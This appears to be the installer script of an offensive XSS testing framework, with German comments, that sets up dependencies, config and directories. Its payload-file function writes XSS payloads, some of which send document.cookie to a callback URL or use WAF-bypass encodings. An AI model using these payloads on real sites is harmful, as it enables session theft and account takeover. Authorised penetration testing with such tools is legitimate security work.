#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
XSS Hunter Pro Framework - Installation Script
==============================================

Dieses Skript installiert alle erforderlichen Abhängigkeiten für das XSS Hunter Framework.

Autor: Anonymous
Lizenz: MIT
Version: 0.3.0
"""

import os
import sys
import subprocess
import platform
import json
import logging
import time
import shutil
import argparse
from pathlib import Path

# Konfiguriere Logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)

logger = logging.getLogger("XSSHunterPro.Install")

# Definiere die erforderlichen Abhängigkeiten
REQUIRED_PACKAGES = [
    "requests>=2.28.0",
    "jinja2>=3.1.0",
    "beautifulsoup4>=4.11.0",
    "urllib3>=1.26.0",
    "selenium>=4.1.0",
    "pillow>=9.0.0",
    "python-whois>=0.7.0",
    "dnspython>=2.2.0",
    "cryptography>=37.0.0",
    "scikit-learn>=1.0.0",
    "numpy>=1.22.0",
    "pandas>=1.4.0",
    "matplotlib>=3.5.0",
    "tqdm>=4.64.0",
    "colorama>=0.4.5"
]

# Definiere die optionalen Abhängigkeiten
OPTIONAL_PACKAGES = [
    "playwright>=1.20.0",
    "flask>=2.0.0",
    "fastapi>=0.70.0",
    "uvicorn>=0.15.0",
    "aiohttp>=3.8.0",
    "scrapy>=2.5.0",
    "tensorflow>=2.8.0",
    "torch>=1.10.0"
]

# Definiere die erforderlichen Verzeichnisse
REQUIRED_DIRECTORIES = [
    "modules",
    "payloads",
    "reports",
    "screenshots",
    "callbacks",
    "logs",
    "data",
    "config",
    "templates",
    "lib"
]

# Definiere die erforderlichen Dateien
REQUIRED_FILES = [
    "requirements.txt",
    "main.py",
    "utils.py",
    "error_handler.py",
    "modules/__init__.py",
    "modules/callback_server.py",
    "modules/exploitation.py",
    "modules/payload_manager.py",
    "modules/report_generator.py",
    "modules/target_discovery.py",
    "modules/vuln_categorization.py",
    "payloads/basic.json",
    "payloads/advanced.json",
    "payloads/dom.json",
    "payloads/waf_bypass.json",
    "config/config.json"
]


def check_python_version():
    """
    Überprüft die Python-Version.
    
    Returns:
        True, wenn die Python-Version kompatibel ist, sonst False.
    """
    major, minor, _ = platform.python_version_tuple()
    
    if int(major) < 3 or (int(major) == 3 and int(minor) < 7):
        logger.error(f"Python-Version {major}.{minor} ist nicht kompatibel. Python 3.7 oder höher wird benötigt.")
        return False
    
    logger.info(f"Python-Version {major}.{minor} ist kompatibel.")
    return True


def check_pip():
    """
    Überprüft, ob pip installiert ist.
    
    Returns:
        True, wenn pip installiert ist, sonst False.
    """
    try:
        subprocess.run([sys.executable, "-m", "pip", "--version"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        logger.info("pip ist installiert.")
        return True
    except subprocess.CalledProcessError:
        logger.error("pip ist nicht installiert.")
        return False


def install_package(package):
    """
    Installiert ein Paket mit pip.
    
    Args:
        package: Das zu installierende Paket.
    
    Returns:
        True, wenn das Paket erfolgreich installiert wurde, sonst False.
    """
    try:
        logger.info(f"Installiere {package}...")
        subprocess.run([sys.executable, "-m", "pip", "install", package], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        logger.info(f"{package} wurde erfolgreich installiert.")
        return True
    except subprocess.CalledProcessError as e:
        logger.error(f"Fehler beim Installieren von {package}: {e}")
        return False


def check_package(package):
    """
    Überprüft, ob ein Paket installiert ist.
    
    Args:
        package: Das zu überprüfende Paket.
    
    Returns:
        True, wenn das Paket installiert ist, sonst False.
    """
    package_name = package.split(">=")[0].split("==")[0].strip()
    
    try:
        __import__(package_name)
        logger.info(f"{package_name} ist installiert.")
        return True
    except ImportError:
        logger.warning(f"{package_name} ist nicht installiert.")
        return False


def create_directory(directory):
    """
    Erstellt ein Verzeichnis, falls es nicht existiert.
    
    Args:
        directory: Das zu erstellende Verzeichnis.
    
    Returns:
        True, wenn das Verzeichnis erfolgreich erstellt wurde oder bereits existiert, sonst False.
    """
    try:
        os.makedirs(directory, exist_ok=True)
        logger.info(f"Verzeichnis {directory} wurde erstellt oder existiert bereits.")
        return True
    except Exception as e:
        logger.error(f"Fehler beim Erstellen des Verzeichnisses {directory}: {e}")
        return False


def create_requirements_file():
    """
    Erstellt die requirements.txt-Datei.
    
    Returns:
        True, wenn die Datei erfolgreich erstellt wurde, sonst False.
    """
    try:
        with open("requirements.txt", "w") as f:
            for package in REQUIRED_PACKAGES:
                f.write(f"{package}\n")
            
            # Füge optionale Pakete als Kommentare hinzu
            f.write("\n# Optionale Pakete\n")
            for package in OPTIONAL_PACKAGES:
                f.write(f"# {package}\n")
        
        logger.info("requirements.txt wurde erstellt.")
        return True
    except Exception as e:
        logger.error(f"Fehler beim Erstellen der requirements.txt: {e}")
        return False


def create_config_file():
    """
    Erstellt die Konfigurationsdatei.
    
    Returns:
        True, wenn die Datei erfolgreich erstellt wurde, sonst False.
    """
    try:
        config = {
            "version": "0.3.0",
            "callback_server": {
                "host": "0.0.0.0",
                "port": 8080,
                "callbacks_dir": "callbacks",
                "response_type": "empty"
            },
            "exploitation": {
                "payloads_dir": "payloads",
                "timeout": 10
            },
            "reporting": {
                "reports_dir": "reports",
                "templates_dir": "templates",
                "default_format": "html"
            },
            "screenshots": {
                "screenshots_dir": "screenshots",
                "format": "png",
                "quality": 90
            },
            "logging": {
                "logs_dir": "logs",
                "level": "INFO",
                "max_size": 10485760,  # 10 MB
                "backup_count": 5
            },
            "proxy": {
                "enabled": False,
                "http": "",
                "https": "",
                "no_proxy": ""
            },
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        
        os.makedirs("config", exist_ok=True)
        
        with open("config/config.json", "w") as f:
            json.dump(config, f, indent=2)
        
        logger.info("config/config.json wurde erstellt.")
        return True
    except Exception as e:
        logger.error(f"Fehler beim Erstellen der Konfigurationsdatei: {e}")
        return False


def create_payload_files():
    """
    Erstellt die Payload-Dateien.
    
    Returns:
        True, wenn die Dateien erfolgreich erstellt wurden, sonst False.
    """
    try:
        os.makedirs("payloads", exist_ok=True)
        
        # Erstelle basic.json
        basic_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\">",
            "<input autofocus onfocus=alert('XSS')>"
        ]
        
        with open("payloads/basic.json", "w") as f:
            json.dump(basic_payloads, f, indent=2)
        
        # Erstelle advanced.json
        advanced_payloads = [
            "<script>fetch('CALLBACK_URL?data='+document.cookie)</script>",
            "<img src=x onerror=\"fetch('CALLBACK_URL?data='+document.cookie)\">",
            "<svg onload=\"fetch('CALLBACK_URL?data='+document.cookie)\">",
            "<script>var xhr=new XMLHttpRequest();xhr.open('GET','CALLBACK_URL?data='+document.cookie,true);xhr.send();</script>",
            "<script>navigator.sendBeacon('CALLBACK_URL?data='+document.cookie)</script>"
        ]
        
        with open("payloads/advanced.json", "w") as f:
            json.dump(advanced_payloads, f, indent=2)
        
        # Erstelle dom.json
        dom_payloads = [
            "<script>document.getElementById('vulnerable').innerHTML='<img src=x onerror=alert(1)>';</script>",
            "<script>document.write('<img src=x onerror=alert(1)>');</script>",
            "<script>window.location.hash.substr(1)</script>",
            "<script>eval(location.hash.substr(1))</script>"
        ]
        
        with open("payloads/dom.json", "w") as f:
            json.dump(dom_payloads, f, indent=2)
        
        # Erstelle waf_bypass.json
        waf_bypass_payloads = [
            "<script>al\\u0065rt('XSS')</script>",
            "<img src=x onerror=\\u0061lert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<script>a=alert;a('XSS')</script>",
            "<script>\\u0061lert('XSS')</script>",
            "<script>prompt(1)</script>",
            "<script>confirm(1)</script>"
        ]
        
        with open("payloads/waf_bypass.json", "w") as f:
            json.dump(waf_bypass_payloads, f, indent=2)
        
        logger.info("Payload-Dateien wurden erstellt.")
        return True
    except Exception as e:
        logger.error(f"Fehler beim Erstellen der Payload-Dateien: {e}")
        return False


def check_file_exists(file_path):
    """
    Überprüft, ob eine Datei existiert.
    
    Args:
        file_path: Der Pfad zur Datei.
    
    Returns:
        True, wenn die Datei existiert, sonst False.
    """
    return os.path.isfile(file_path)


def check_required_files():
    """
    Überprüft, ob alle erforderlichen Dateien existieren.
    
    Returns:
        Eine Liste der fehlenden Dateien.
    """
    missing_files = []
    
    for file_path in REQUIRED_FILES:
        if not check_file_exists(file_path):
            missing_files.append(file_path)
    
    return missing_files


def create_virtual_environment(venv_dir):
    """
    Erstellt eine virtuelle Umgebung.
    
    Args:
        venv_dir: Das Verzeichnis für die virtuelle Umgebung.
    
    Returns:
        True, wenn die virtuelle Umgebung erfolgreich erstellt wurde, sonst False.
    """
    try:
        logger.info(f"Erstelle virtuelle Umgebung in {venv_dir}...")
        subprocess.run([sys.executable, "-m", "venv", venv_dir], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        logger.info(f"Virtuelle Umgebung wurde in {venv_dir} erstellt.")
        return True
    except subprocess.CalledProcessError as e:
        logger.error(f"Fehler beim Erstellen der virtuellen Umgebung: {e}")
        return False


def activate_virtual_environment(venv_dir):
    """
    Aktiviert eine virtuelle Umgebung.
    
    Args:
        venv_dir: Das Verzeichnis der virtuellen Umgebung.
    
    Returns:
        True, wenn die virtuelle Umgebung erfolgreich aktiviert wurde, sonst False.
    """
    try:
        # Bestimme den Pfad zum Python-Interpreter in der virtuellen Umgebung
        if platform.system() == "Windows":
            python_path = os.path.join(venv_dir, "Scripts", "python.exe")
        else:
            python_path = os.path.join(venv_dir, "bin", "python")
        
        # Überprüfe, ob der Python-Interpreter existiert
        if not os.path.isfile(python_path):
            logger.error(f"Python-Interpreter {python_path} nicht gefunden.")
            return False
        
        # Setze den Python-Interpreter
        os.environ["VIRTUAL_ENV"] = venv_dir
        os.environ["PATH"] = os.path.dirname(python_path) + os.pathsep + os.environ["PATH"]
        
        # Entferne PYTHONHOME, falls gesetzt
        if "PYTHONHOME" in os.environ:
            del os.environ["PYTHONHOME"]
        
        logger.info(f"Virtuelle Umgebung in {venv_dir} wurde aktiviert.")
        return True
    except Exception as e:
        logger.error(f"Fehler beim Aktivieren der virtuellen Umgebung: {e}")
        return False


def install_dependencies(use_venv=False, venv_dir=".venv", upgrade=False):
    """
    Installiert die erforderlichen Abhängigkeiten.
    
    Args:
        use_venv: Ob eine virtuelle Umgebung verwendet werden soll.
        venv_dir: Das Verzeichnis für die virtuelle Umgebung.
        upgrade: Ob die Pakete aktualisiert werden sollen.
    
    Returns:
        True, wenn alle Abhängigkeiten erfolgreich installiert wurden, sonst False.
    """
    # Überprüfe die Python-Version
    if not check_python_version():
        return False
    
    # Überprüfe, ob pip installiert ist
    if not check_pip():
        logger.error("pip ist nicht installiert. Bitte installiere pip und versuche es erneut.")
        return False
    
    # Erstelle eine virtuelle Umgebung, falls gewünscht
    if use_venv:
        if not create_virtual_environment(venv_dir):
            logger.error("Fehler beim Erstellen der virtuellen Umgebung.")
            return False
        
        if not activate_virtual_environment(venv_dir):
            logger.error("Fehler beim Aktivieren der virtuellen Umgebung.")
            return False
    
    # Erstelle die requirements.txt-Datei
    if not check_file_exists("requirements.txt"):
        if not create_requirements_file():
            logger.error("Fehler beim Erstellen der requirements.txt-Datei.")
            return False
    
    # Installiere die Abhängigkeiten
    try:
        logger.info("Installiere Abhängigkeiten...")
        
        # Aktualisiere pip
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Installiere die Abhängigkeiten aus der requirements.txt-Datei
        cmd = [sys.executable, "-m", "pip", "install", "-r", "requirements.txt"]
        
        if upgrade:
            cmd.append("--upgrade")
        
        subprocess.run(cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        logger.info("Abhängigkeiten wurden erfolgreich installiert.")
        return True
    except subprocess.CalledProcessError as e:
        logger.error(f"Fehler beim Installieren der Abhängigkeiten: {e}")
        
        # Versuche, die Abhängigkeiten einzeln zu installieren
        logger.info("Versuche, die Abhängigkeiten einzeln zu installieren...")
        
        success = True
        
        for package in REQUIRED_PACKAGES:
            if not check_package(package):
                if not install_package(package):
                    logger.error(f"Fehler beim Installieren von {package}.")
                    success = False
        
        return success


def setup_framework():
    """
    Richtet das Framework ein.
    
    Returns:
        True, wenn das Framework erfolgreich eingerichtet wurde, sonst False.
    """
    # Erstelle die erforderlichen Verzeichnisse
    for directory in REQUIRED_DIRECTORIES:
        if not create_directory(directory):
            logger.error(f"Fehler beim Erstellen des Verzeichnisses {directory}.")
            return False
    
    # Erstelle die Konfigurationsdatei
    if not check_file_exists("config/config.json"):
        if not create_config_file():
            logger.error("Fehler beim Erstellen der Konfigurationsdatei.")
            return False
    
    # Erstelle die Payload-Dateien
    if not all(check_file_exists(f"payloads/{payload_type}.json") for payload_type in ["basic", "advanced", "dom", "waf_bypass"]):
        if not create_payload_files():
            logger.error("Fehler beim Erstellen der Payload-Dateien.")
            return False
    
    # Überprüfe, ob alle erforderlichen Dateien existieren
    missing_files = check_required_files()
    
    if missing_files:
        logger.warning(f"Die folgenden Dateien fehlen: {', '.join(missing_files)}")
        logger.warning("Das Framework ist möglicherweise nicht vollständig funktionsfähig.")
    
    logger.info("Framework wurde erfolgreich eingerichtet.")
    return True


def create_dependency_wrapper():
    """
    Erstellt den Dependency Wrapper.
    
    Returns:
        True, wenn der Wrapper erfolgreich erstellt wurde, sonst False.
    """
    try:
        os.makedirs("lib", exist_ok=True)
        
        wrapper_code = """#!/usr/bin/env python3
# -*- coding: utf-8 -*-

\"\"\"
XSS Hunter Pro Framework - Dependency Wrapper
=============================================

Dieser Wrapper stellt Fallback-Implementierungen für fehlende Abhängigkeiten bereit.

Autor: Anonymous
Lizenz: MIT
Version: 0.3.0
\"\"\"

import os
import sys
import logging
import importlib
import subprocess
import time
import json
import re
import random
import string
import urllib.parse
import socket
import base64
import hashlib
from typing import Dict, List, Optional, Any, Tuple, Union, Set

# Konfiguriere Logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)

logger = logging.getLogger("XSSHunterPro.DependencyWrapper")


def import_or_install(package_name, package_import=None, min_version=None):
    \"\"\"
    Importiert ein Paket oder installiert es, falls es nicht vorhanden ist.
    
    Args:
        package_name: Der Name des Pakets.
        package_import: Der Name des zu importierenden Moduls (falls abweichend).
        min_version: Die Mindestversion des Pakets.
    
    Returns:
        Das importierte Modul oder None, wenn das Paket nicht importiert werden konnte.
    \"\"\"
    import_name = package_import or package_name
    
    try:
        # Versuche, das Paket zu importieren
        module = importlib.import_module(import_name)
        
        # Überprüfe die Version, falls erforderlich
        if min_version:
            try:
                version = module.__version__
                if version < min_version:
                    logger.warning(f"{package_name} Version {version} ist älter als die erforderliche Version {min_version}.")
                    raise ImportError(f"{package_name} Version {version} ist älter als die erforderliche Version {min_version}.")
            except AttributeError:
                logger.warning(f"Version von {package_name} konnte nicht überprüft werden.")
        
        return module
    except ImportError:
        logger.warning(f"{package_name} ist nicht installiert oder die Version ist zu alt.")
        
        try:
            # Versuche, das Paket zu installieren
            logger.info(f"Installiere {package_name}...")
            
            if min_version:
                package_spec = f"{package_name}>={min_version}"
            else:
                package_spec = package_name
            
            subprocess.run([sys.executable, "-m", "pip", "install", package_spec], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Versuche erneut, das Paket zu importieren
            return importlib.import_module(import_name)
        except Exception as e:
            logger.error(f"Fehler beim Installieren von {package_name}: {e}")
            return None


# Requests
try:
    import requests
except ImportError:
    requests = import_or_install("requests", min_version="2.28.0")

if requests is None:
    # Fallback für Requests
    class Response:
        def __init__(self, status_code=200, text="", headers=None, url=""):
            self.status_code = status_code
            self.text = text
            self.headers = headers or {}
            self.url = url
    
    class RequestsFallback:
        def get(self, url, params=None, headers=None, cookies=None, timeout=10):
            logger.error("Requests-Modul ist nicht verfügbar. GET-Anfrage kann nicht durchgeführt werden.")
            return Response(status_code=500, text="Requests module not available", url=url)
        
        def post(self, url, data=None, json=None, headers=None, cookies=None, timeout=10):
            logger.error("Requests-Modul ist nicht verfügbar. POST-Anfrage kann nicht durchgeführt werden.")
            return Response(status_code=500, text="Requests module not available", url=url)
    
    requests = RequestsFallback()


# BeautifulSoup
try:
    from bs4 import BeautifulSoup
except ImportError:
    bs4 = import_or_install("beautifulsoup4", package_import="bs4", min_version="4.11.0")
    
    if bs4 is not None:
        BeautifulSoup = bs4.BeautifulSoup
    else:
        # Fallback für BeautifulSoup
        class BeautifulSoup:
            def __init__(self, html, parser="html.parser"):
                self.html = html
                self.parser = parser
            
            def find_all(self, tags, **kwargs):
                logger.error("BeautifulSoup-Modul ist nicht verfügbar. HTML-Parsing ist eingeschränkt.")
                return []


# Selenium
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    SELENIUM_AVAILABLE = True
except ImportError:
    selenium = import_or_install("selenium", min_version="4.1.0")
    
    if selenium is not None:
        from selenium import webdriver
        from selenium.webdriver.common.by import By
        from selenium.webdriver.common.keys import Keys
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        SELENIUM_AVAILABLE = True
    else:
        SELENIUM_AVAILABLE = False


# Pillow
try:
    from PIL import Image
    PILLOW_AVAILABLE = True
except ImportError:
    pillow = import_or_install("pillow", package_import="PIL", min_version="9.0.0")
    
    if pillow is not None:
        from PIL import Image
        PILLOW_AVAILABLE = True
    else:
        PILLOW_AVAILABLE = False


# Jinja2
try:
    import jinja2
    JINJA2_AVAILABLE = True
except ImportError:
    jinja2 = import_or_install("jinja2", min_version="3.1.0")
    JINJA2_AVAILABLE = (jinja2 is not None)


# NumPy
try:
    import numpy as np
    NUMPY_AVAILABLE = True
except ImportError:
    numpy = import_or_install("numpy", package_import="numpy", min_version="1.22.0")
    
    if numpy is not None:
        import numpy as np
        NUMPY_AVAILABLE = True
    else:
        NUMPY_AVAILABLE = False


# Pandas
try:
    import pandas as pd
    PANDAS_AVAILABLE = True
except ImportError:
    pandas = import_or_install("pandas", package_import="pandas", min_version="1.4.0")
    
    if pandas is not None:
        import pandas as pd
        PANDAS_AVAILABLE = True
    else:
        PANDAS_AVAILABLE = False


# Scikit-learn
try:
    import sklearn
    SKLEARN_AVAILABLE = True
except ImportError:
    sklearn = import_or_install("scikit-learn", package_import="sklearn", min_version="1.0.0")
    SKLEARN_AVAILABLE = (sklearn is not None)


# Matplotlib
try:
    import matplotlib.pyplot as plt
    MATPLOTLIB_AVAILABLE = True
except ImportError:
    matplotlib = import_or_install("matplotlib", package_import="matplotlib", min_version="3.5.0")
    
    if matplotlib is not None:
        import matplotlib.pyplot as plt
        MATPLOTLIB_AVAILABLE = True
    else:
        MATPLOTLIB_AVAILABLE = False


# TQDM
try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    tqdm_module = import_or_install("tqdm", min_version="4.64.0")
    
    if tqdm_module is not None:
        from tqdm import tqdm
        TQDM_AVAILABLE = True
    else:
        TQDM_AVAILABLE = False
        
        # Fallback für TQDM
        def tqdm(iterable, *args, **kwargs):
            return iterable


# Colorama
try:
    import colorama
    from colorama import Fore, Back, Style
    colorama.init()
    COLORAMA_AVAILABLE = True
except ImportError:
    colorama = import_or_install("colorama", min_version="0.4.5")
    
    if colorama is not None:
        from colorama import Fore, Back, Style
        colorama.init()
        COLORAMA_AVAILABLE = True
    else:
        COLORAMA_AVAILABLE = False
        
        # Fallback für Colorama
        class ColoramaFallback:
            def __init__(self):
                self.RED = ''
                self.GREEN = ''
                self.YELLOW = ''
                self.BLUE = ''
                self.MAGENTA = ''
                self.CYAN = ''
                self.WHITE = ''
                self.BLACK = ''
                self.RESET = ''
        
        Fore = ColoramaFallback()
        Back = ColoramaFallback()
        
        class StyleFallback:
            def __init__(self):
                self.BRIGHT = ''
                self.DIM = ''
                self.NORMAL = ''
                self.RESET_ALL = ''
        
        Style = StyleFallback()


# Überprüfe die Verfügbarkeit der Abhängigkeiten
def check_dependencies():
    \"\"\"
    Überprüft die Verfügbarkeit der Abhängigkeiten.
    
    Returns:
        Ein Dictionary mit den Verfügbarkeitsinformationen.
    \"\"\"
    return {
        "requests": requests is not None,
        "beautifulsoup4": 'BeautifulSoup' in globals(),
        "selenium": SELENIUM_AVAILABLE,
        "pillow": PILLOW_AVAILABLE,
        "jinja2": JINJA2_AVAILABLE,
        "numpy": NUMPY_AVAILABLE,
        "pandas": PANDAS_AVAILABLE,
        "scikit-learn": SKLEARN_AVAILABLE,
        "matplotlib": MATPLOTLIB_AVAILABLE,
        "tqdm": TQDM_AVAILABLE,
        "colorama": COLORAMA_AVAILABLE
    }


# Zeige die Verfügbarkeit der Abhängigkeiten an
def print_dependencies_status():
    \"\"\"
    Zeigt die Verfügbarkeit der Abhängigkeiten an.
    \"\"\"
    dependencies = check_dependencies()
    
    logger.info("Abhängigkeitsstatus:")
    
    for package, available in dependencies.items():
        status = "Verfügbar" if available else "Nicht verfügbar"
        logger.info(f"  {package}: {status}")


# Beispielverwendung
if __name__ == "__main__":
    print_dependencies_status()
"""
        
        with open("lib/dependency_wrapper.py", "w") as f:
            f.write(wrapper_code)
        
        # Erstelle __init__.py
        with open("lib/__init__.py", "w") as f:
            f.write("""#!/usr/bin/env python3
# -*- coding: utf-8 -*-

\"\"\"
XSS Hunter Pro Framework - Lib Package
======================================

Dieses Paket enthält Hilfsbibliotheken für das XSS Hunter Framework.

Autor: Anonymous
Lizenz: MIT
Version: 0.3.0
\"\"\"

from . import dependency_wrapper

__all__ = ['dependency_wrapper']
""")
        
        logger.info("Dependency Wrapper wurde erstellt.")
        return True
    except Exception as e:
        logger.error(f"Fehler beim Erstellen des Dependency Wrappers: {e}")
        return False


def main():
    """
    Hauptfunktion.
    """
    parser = argparse.ArgumentParser(description="XSS Hunter Pro Framework - Installation")
    parser.add_argument("--venv", action="store_true", help="Erstelle und verwende eine virtuelle Umgebung")
    parser.add_argument("--venv-dir", default=".venv", help="Verzeichnis für die virtuelle Umgebung")
    parser.add_argument("--upgrade", action="store_true", help="Aktualisiere die Pakete")
    parser.add_argument("--no-setup", action="store_true", help="Überspringe die Framework-Einrichtung")
    parser.add_argument("--force", action="store_true", help="Erzwinge die Installation, auch wenn Dateien fehlen")
    
    args = parser.parse_args()
    
    logger.info("XSS Hunter Pro Framework - Installation")
    logger.info("======================================")
    
    # Installiere die Abhängigkeiten
    if not install_dependencies(use_venv=args.venv, venv_dir=args.venv_dir, upgrade=args.upgrade):
        logger.error("Fehler beim Installieren der Abhängigkeiten.")
        
        if not args.force:
            return 1
    
    # Erstelle den Dependency Wrapper
    if not create_dependency_wrapper():
        logger.error("Fehler beim Erstellen des Dependency Wrappers.")
        
        if not args.force:
            return 1
    
    # Richte das Framework ein
    if not args.no_setup:
        if not setup_framework():
            logger.error("Fehler beim Einrichten des Frameworks.")
            
            if not args.force:
                return 1
    
    logger.info("Installation abgeschlossen.")
    
    # Überprüfe, ob alle erforderlichen Dateien existieren
    missing_files = check_required_files()
    
    if missing_files:
        logger.warning(f"Die folgenden Dateien fehlen: {', '.join(missing_files)}")
        logger.warning("Das Framework ist möglicherweise nicht vollständig funktionsfähig.")
        
        if not args.force:
            return 1
    
    return 0


if __name__ == "__main__":
    sys.exit(main())
